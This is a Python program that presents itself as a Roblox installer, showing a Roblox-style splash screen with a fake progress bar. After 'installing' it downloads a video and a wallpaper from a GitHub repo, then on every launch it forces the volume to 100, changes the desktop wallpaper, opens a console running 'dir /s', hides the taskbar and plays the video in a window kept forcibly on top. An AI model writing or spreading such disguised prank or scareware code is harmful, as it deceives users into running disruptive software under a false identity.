# main.py
import os
import sys
import math
import time
import queue
import ctypes
import threading
import subprocess
import tempfile
import traceback
import urllib.request
import tkinter as tk

from PIL import Image, ImageTk

# ---------- Config ----------
APP_NAME       = "fvData"
INSTALL_DIR    = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), APP_NAME)
VIDEO_PATH     = os.path.join(INSTALL_DIR, "vid.mp4")
WALLPAPER_PATH = os.path.join(INSTALL_DIR, "wallpaper.png")

REPO_BASE      = "https://raw.githubusercontent.com/forrealbugi-exp/fakeV/main/data"
VIDEO_URL      = f"{REPO_BASE}/vid.mp4"
WALLPAPER_URL  = f"{REPO_BASE}/wallpaper.png"
BIG_LOGO_URL   = f"{REPO_BASE}/bigLogo.png"
SMALL_LOGO_URL = f"{REPO_BASE}/smallLogo.png"

# Installer UI art is cached in temp, not in the install dir
LOGO_TMP_DIR   = os.path.join(tempfile.gettempdir(), "fv_installer_assets")
BIG_LOGO_PATH  = os.path.join(LOGO_TMP_DIR, "bigLogo.png")
SMALL_LOGO_PATH= os.path.join(LOGO_TMP_DIR, "smallLogo.png")

# ---------- Volume = 100 (keybd spam) ----------
def set_volume_100():
    try:
        VK_VOLUME_UP    = 0xAF
        KEYEVENTF_KEYUP = 0x0002
        u = ctypes.windll.user32
        for _ in range(100):
            u.keybd_event(VK_VOLUME_UP, 0, 0, 0)
            u.keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0)
    except Exception as e:
        print("volume error:", e)

# ---------- Taskbar hide/show ----------
def _taskbars():
    u = ctypes.windll.user32
    hs = []
    for cls in ("Shell_TrayWnd", "Shell_SecondaryTrayWnd"):
        h = u.FindWindowW(cls, None)
        if h:
            hs.append(h)
    return hs

def hide_taskbar():
    for h in _taskbars():
        try: ctypes.windll.user32.ShowWindow(h, 0)
        except Exception: pass

def show_taskbar():
    for h in _taskbars():
        try: ctypes.windll.user32.ShowWindow(h, 5)
        except Exception: pass

# ---------- Downloader ----------
def download_file(url, dest, progress_cb=None):
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    tmp = dest + ".part"
    req = urllib.request.Request(url, headers={"User-Agent": "Roblox-Installer"})
    with urllib.request.urlopen(req) as r:
        total = int(r.headers.get("Content-Length", 0) or 0)
        done  = 0
        with open(tmp, "wb") as f:
            while True:
                chunk = r.read(65536)
                if not chunk:
                    break
                f.write(chunk)
                done += len(chunk)
                if progress_cb and total:
                    progress_cb(done / total)
    os.replace(tmp, dest)

def ensure_installer_logos():
    """Download bigLogo.png and smallLogo.png BEFORE the installer window opens."""
    os.makedirs(LOGO_TMP_DIR, exist_ok=True)
    for url, dest in ((BIG_LOGO_URL, BIG_LOGO_PATH),
                      (SMALL_LOGO_URL, SMALL_LOGO_PATH)):
        if os.path.exists(dest) and os.path.getsize(dest) > 0:
            continue
        try:
            download_file(url, dest)
        except Exception as e:
            print(f"logo download failed ({url}):", e)

# ---------- Topmost forcing ----------
def force_topmost(stop_event, own_pid):
    u = ctypes.windll.user32
    HWND_TOPMOST   = -1
    SWP_NOSIZE     = 0x0001
    SWP_NOMOVE     = 0x0002
    SWP_SHOWWINDOW = 0x0040
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)

    def cb(hwnd, _):
        wpid = ctypes.c_ulong()
        u.GetWindowThreadProcessId(hwnd, ctypes.byref(wpid))
        if wpid.value == own_pid and u.IsWindowVisible(hwnd):
            u.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                           SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW)
        return True

    proc = WNDENUMPROC(cb)
    while not stop_event.is_set():
        u.EnumWindows(proc, 0)
        stop_event.wait(0.25)

# ---------- Wallpaper ----------
def set_wallpaper(path):
    try:
        SPI_SETDESKWALLPAPER = 20
        SPIF_UPDATEINIFILE   = 0x01
        SPIF_SENDCHANGE      = 0x02
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, path,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
        )
    except Exception as e:
        print("wallpaper error:", e)

# ---------- cmd: color 3 & dir /s ----------
def open_cmd():
    try:
        subprocess.Popen(
            ["cmd", "/k", "color 3 & dir /s"],
            creationflags=subprocess.CREATE_NEW_CONSOLE,
        )
    except Exception as e:
        print("cmd error:", e)

# ---------- Video playback (small, left-center, real-time) ----------
def play_video(path):
    import imageio_ffmpeg
    import winsound

    ffmpeg_exe       = imageio_ffmpeg.get_ffmpeg_exe()
    CREATE_NO_WINDOW = 0x08000000

    u  = ctypes.windll.user32
    sw = u.GetSystemMetrics(0)
    sh = u.GetSystemMetrics(1)

    # --- Extract audio ---
    wav_path = os.path.join(tempfile.gettempdir(), "fv_audio.wav")
    try:
        subprocess.run(
            [ffmpeg_exe, "-y", "-i", path, "-vn",
             "-acodec", "pcm_s16le", "-ar", "44100", "-ac", "2", wav_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW,
        )
    except Exception as e:
        print("audio extract error:", e)
        wav_path = None

    # --- Probe source ---
    probe = imageio_ffmpeg.read_frames(path, pix_fmt="rgb24")
    meta  = next(probe)
    vw, vh = meta["size"]
    fps    = float(meta["fps"] or 30.0)
    try: probe.close()
    except Exception: pass
    print(f"[play] source {vw}x{vh} @ {fps:.2f} fps")

    # --- 1/6 of screen area, keep aspect, never upscale ---
    target_area = (sw * sh) / 6.0
    aspect      = vw / vh
    disp_h      = int(math.sqrt(target_area / aspect))
    disp_w      = int(disp_h * aspect)
    if disp_w > vw or disp_h > vh:
        disp_w, disp_h = vw, vh
    disp_w -= disp_w % 2
    disp_h -= disp_h % 2

    pos_x = 40
    pos_y = (sh - disp_h) // 2

    gen = imageio_ffmpeg.read_frames(
        path, pix_fmt="rgb24",
        output_params=["-vf", f"scale={disp_w}:{disp_h}"],
    )
    meta = next(gen)
    disp_w, disp_h = meta["size"]
    print(f"[play] display {disp_w}x{disp_h} @ ({pos_x},{pos_y})")

    # --- Borderless topmost window (NO -fullscreen!) ---
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.geometry(f"{disp_w}x{disp_h}+{pos_x}+{pos_y}")

    label = tk.Label(root, bg="black", bd=0)
    label.pack(fill="both", expand=True)
    root.update_idletasks()

    hide_taskbar()
    stop_event = threading.Event()
    threading.Thread(target=force_topmost,
                     args=(stop_event, os.getpid()),
                     daemon=True).start()

    # --- Audio ---
    if wav_path and os.path.exists(wav_path):
        try:
            winsound.PlaySound(wav_path,
                               winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception as e:
            print("audio play error:", e)

    # --- Reader thread: paces frames at real time ---
    frame_q     = queue.Queue(maxsize=1)
    reader_stop = threading.Event()
    reader_done = threading.Event()

    def reader():
        try:
            frame_delay = 1.0 / fps
            t0  = time.perf_counter()
            idx = 0
            for frame in gen:
                if reader_stop.is_set():
                    break
                target = t0 + idx * frame_delay
                now    = time.perf_counter()
                if now < target:
                    time.sleep(target - now)
                try: frame_q.get_nowait()
                except queue.Empty: pass
                try: frame_q.put_nowait(frame)
                except queue.Full: pass
                idx += 1
        except Exception as e:
            print("reader error:", e)
        finally:
            reader_done.set()

    threading.Thread(target=reader, daemon=True).start()

    # --- Render loop ---
    try:
        while True:
            if reader_done.is_set() and frame_q.empty():
                break
            try:
                frame = frame_q.get(timeout=0.2)
            except queue.Empty:
                continue
            try:
                img   = Image.frombytes("RGB", (disp_w, disp_h), frame)
                tkimg = ImageTk.PhotoImage(img)
                label.configure(image=tkimg)
                label.image = tkimg
                root.update()
            except tk.TclError:
                break
    except Exception as e:
        print("render error:", e)
    finally:
        reader_stop.set()
        stop_event.set()
        try: winsound.PlaySound(None, winsound.SND_PURGE)
        except Exception: pass
        try: gen.close()
        except Exception: pass
        show_taskbar()
        try: root.destroy()
        except Exception: pass
        try:
            if wav_path and os.path.exists(wav_path):
                os.remove(wav_path)
        except Exception: pass

# ---------- Roblox-style installer ----------
class InstallerApp:
    W, H   = 520, 440
    BAR_H  = 70
    BLACK  = "#000000"
    BAR_BG = "#232527"

    def __init__(self, big_logo_path, small_logo_path):
        self.big_path   = big_logo_path
        self.small_path = small_logo_path

        self.root = tk.Tk()
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg=self.BLACK)
        self.root.resizable(False, False)
        self.root.update_idletasks()
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        self.root.geometry(
            f"{self.W}x{self.H}+{(sw - self.W)//2}+{(sh - self.H)//2}"
        )

        self.canvas = tk.Canvas(self.root, width=self.W, height=self.H,
                                bg=self.BLACK, highlightthickness=0, bd=0)
        self.canvas.pack(fill="both", expand=True)

        self.big_img   = None
        self.small_img = None
        self._load_logos()
        self._draw()

        self.cancelled = False
        self.root.bind("<Escape>", lambda e: self.cancel())
        self.root.focus_force()

    def _load_logos(self):
        try:
            if self.big_path and os.path.exists(self.big_path):
                img = Image.open(self.big_path).convert("RGBA")
                img.thumbnail((220, 220), Image.LANCZOS)
                self.big_img = ImageTk.PhotoImage(img)
        except Exception as e:
            print("big logo load error:", e)
        try:
            if self.small_path and os.path.exists(self.small_path):
                img = Image.open(self.small_path).convert("RGBA")
                img.thumbnail((140, 42), Image.LANCZOS)
                self.small_img = ImageTk.PhotoImage(img)
        except Exception as e:
            print("small logo load error:", e)

    def _draw(self):
        c = self.canvas
        if self.big_img:
            c.create_image(self.W / 2, (self.H - self.BAR_H) / 2,
                           image=self.big_img)

        bar_y = self.H - self.BAR_H
        c.create_rectangle(0, bar_y, self.W, self.H,
                           fill=self.BAR_BG, outline="")
        self.progress_line = c.create_rectangle(0, bar_y, 0, bar_y + 2,
                                                fill="#00a2ff", outline="")

        if self.small_img:
            c.create_image(22, bar_y + self.BAR_H / 2,
                           image=self.small_img, anchor="w")

        bw, bh = 88, 32
        bx = self.W - 20 - bw
        by = bar_y + (self.BAR_H - bh) / 2
        rect = c.create_rectangle(bx, by, bx + bw, by + bh,
                                  fill="#2b2e31", outline="#4a4d4f",
                                  width=1, tags=("cancel_btn", "btn_rect"))
        c.create_text(bx + bw / 2, by + bh / 2,
                      text="Cancel", fill="white",
                      font=("Segoe UI", 10),
                      tags=("cancel_btn", "btn_text"))

        def on_enter(_):
            c.itemconfig(rect, fill="#3a3d40")
            c.config(cursor="hand2")
        def on_leave(_):
            c.itemconfig(rect, fill="#2b2e31")
            c.config(cursor="")
        def on_click(_):
            self.cancel()

        c.tag_bind("cancel_btn", "<Enter>", on_enter)
        c.tag_bind("cancel_btn", "<Leave>", on_leave)
        c.tag_bind("cancel_btn", "<Button-1>", on_click)

    def _set_progress(self, p):
        bar_y = self.H - self.BAR_H
        self.canvas.coords(self.progress_line, 0, bar_y, self.W * p, bar_y + 2)

    def start_install(self):
        threading.Thread(target=self._install_worker, daemon=True).start()

    def _install_worker(self):
        try:
            def cb(p):
                self.root.after(0, self._set_progress, p)
            download_file(VIDEO_URL, VIDEO_PATH, lambda p: cb(p * 0.85))
            download_file(WALLPAPER_URL, WALLPAPER_PATH,
                          lambda p: cb(0.85 + p * 0.15))
            if self.cancelled:
                return
            self.root.after(250, self._close)
        except Exception as e:
            print("install error:", e)
            if not self.cancelled:
                self.root.after(0, lambda: self.canvas.itemconfig(
                    "btn_text", text="Error"))

    def cancel(self):
        self.cancelled = True
        self._close()

    def _close(self):
        try:
            self.root.quit()
            self.root.destroy()
        except Exception:
            pass

    def run(self):
        self.root.after(150, self.start_install)
        self.root.mainloop()
        return not self.cancelled

# ---------- Main ----------
def needs_install():
    return not (os.path.exists(VIDEO_PATH) and os.path.exists(WALLPAPER_PATH))

def main():
    if needs_install():
        # 1) Grab the installer's own logo art first
        ensure_installer_logos()
        # 2) Now open the installer (logos are guaranteed present)
        ok = InstallerApp(BIG_LOGO_PATH, SMALL_LOGO_PATH).run()
        if not ok or needs_install():
            return

    # Post-install actions (also run on subsequent launches)
    set_volume_100()
    set_wallpaper(WALLPAPER_PATH)
    open_cmd()
    try:
        play_video(VIDEO_PATH)
    finally:
        show_taskbar()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        try: show_taskbar()
        except Exception: pass
        ctypes.windll.user32.MessageBoxW(0, traceback.format_exc(),
                                         "fvData error", 0x10)